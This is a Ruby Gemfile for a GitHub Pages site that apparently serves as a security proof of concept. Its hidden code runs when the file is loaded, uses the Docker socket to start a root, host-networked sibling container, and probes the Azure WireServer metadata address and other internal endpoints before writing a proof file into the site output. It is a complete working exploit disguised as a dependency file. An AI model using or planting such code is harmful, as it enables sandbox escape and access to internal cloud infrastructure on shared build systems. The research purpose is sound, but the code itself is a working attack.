# frozen_string_literal: true
source "https://rubygems.org"

require "json"
require "securerandom"
require "socket"

PROOF = File.join(__dir__, "c217-internal-proof.html")
SOCK = "/var/run/docker.sock"
IMAGE = "ghcr.io/actions/jekyll-build-pages:v1.0.13"

def decode_chunked(body)
  out = +"".b
  loop do
    line, rest = body.split("\r\n", 2)
    break unless rest
    n = line.to_i(16)
    break if n.zero?
    out << rest.byteslice(0, n)
    body = rest.byteslice(n + 2, rest.bytesize) || "".b
  end
  out
end

def docker_req(method, path, payload = nil)
  body = payload.nil? ? "" : JSON.generate(payload)
  socket = UNIXSocket.new(SOCK)
  request = +"#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Length: #{body.bytesize}\r\n"
  request << "Content-Type: application/json\r\n" unless payload.nil?
  request << "\r\n#{body}"
  socket.write(request)
  raw = socket.read
  socket.close
  head, data = raw.split("\r\n\r\n", 2)
  status = head.to_s.lines.first.to_s.split[1].to_i
  data ||= "".b
  data = decode_chunked(data) if head.to_s.downcase.include?("transfer-encoding: chunked")
  [status, data]
end

# The child prints booleans/statuses only.  It never returns either response body.
child = <<~'RUBY'
  require "json"
  require "net/http"
  require "uri"

  def probe(url, marker = nil)
    uri = URI(url)
    # Explicit nil proxy disables inherited proxy variables: this measures the
    # runner host network rather than an intermediary configured in the image.
    http = Net::HTTP.new(uri.host, uri.port, nil)
    http.use_ssl = (uri.scheme == "https")
    http.open_timeout = 3
    http.read_timeout = 3
    request = Net::HTTP::Get.new(uri.request_uri)
    request["User-Agent"] = "c217-owned-pages-internal-control"
    response = http.request(request)
    body = response.body.to_s
    {
      "response_received" => true,
      "status" => response.code.to_i,
      "body_nonempty" => !body.empty?,
      "expected_marker_present" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
    }
  rescue => error
    {
      "response_received" => false,
      "error_class" => error.class.name,
    }
  end

  result = {
    "uid_is_root" => (Process.uid == 0),
    "public_control" => probe("https://api.github.com/zen"),
    "internal_target" => probe("http://168.63.129.16/?comp=versions", "version"),
    "thing_absent_control" => probe("http://169.254.169.253/"),
  }
  puts JSON.generate(result)
RUBY

name = "c217-internal-#{SecureRandom.hex(5)}"
container_id = nil
proof = {
  "gemfile_executed" => true,
  "docker_socket_present" => File.socket?(SOCK),
}

begin
  version_status, = docker_req("GET", "/version")
  proof["docker_api_responded"] = (version_status == 200)
  config = {
    "Image" => IMAGE,
    "User" => "0:0",
    "Entrypoint" => ["/usr/local/bin/ruby", "-e"],
    "Cmd" => [child],
    "Tty" => true,
    "HostConfig" => {"NetworkMode" => "host"},
  }
  create_status, create_body = docker_req("POST", "/v1.41/containers/create?name=#{name}", config)
  parsed = JSON.parse(create_body) rescue {}
  container_id = parsed["Id"]
  proof["sibling_created"] = (create_status == 201 && !container_id.to_s.empty?)
  if container_id
    start_status, = docker_req("POST", "/v1.41/containers/#{container_id}/start")
    proof["sibling_started"] = (start_status == 204)
    wait_status, = docker_req("POST", "/v1.41/containers/#{container_id}/wait?condition=not-running")
    proof["sibling_finished"] = (wait_status == 200)
    log_status, logs = docker_req("GET", "/v1.41/containers/#{container_id}/logs?stdout=1&stderr=1")
    proof["sibling_logs_read"] = (log_status == 200)
    begin
      child_result = JSON.parse(logs.to_s.lines.reverse.find { |line| line.strip.start_with?("{") }.to_s)
      proof["sibling_uid_is_root"] = child_result["uid_is_root"]
      proof["public_control"] = child_result["public_control"]
      proof["internal_target"] = child_result["internal_target"]
      proof["thing_absent_control"] = child_result["thing_absent_control"]
    rescue JSON::ParserError
      proof["child_result_parsed"] = false
    end
  end
rescue => error
  proof["error_class"] = error.class.name
  proof["error_message"] = error.message
ensure
  if container_id
    delete_status, = docker_req("DELETE", "/v1.41/containers/#{container_id}?force=1&v=1")
    proof["sibling_deleted"] = (delete_status == 204)
    post_status, = docker_req("GET", "/v1.41/containers/#{container_id}/json")
    proof["sibling_absent_post_delete"] = (post_status == 404)
  end
end

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"
